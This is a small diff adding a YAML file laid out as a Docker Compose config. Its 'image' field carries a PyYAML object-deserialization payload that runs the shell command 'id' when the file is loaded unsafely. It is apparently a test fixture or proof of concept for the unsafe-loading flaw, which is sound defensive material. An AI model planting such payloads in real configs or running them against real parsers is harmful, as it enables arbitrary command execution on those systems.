@@ -1,0 +1,3 @@
+services:
+  web:
+    image: !!python/object/apply:os.system ["id"]
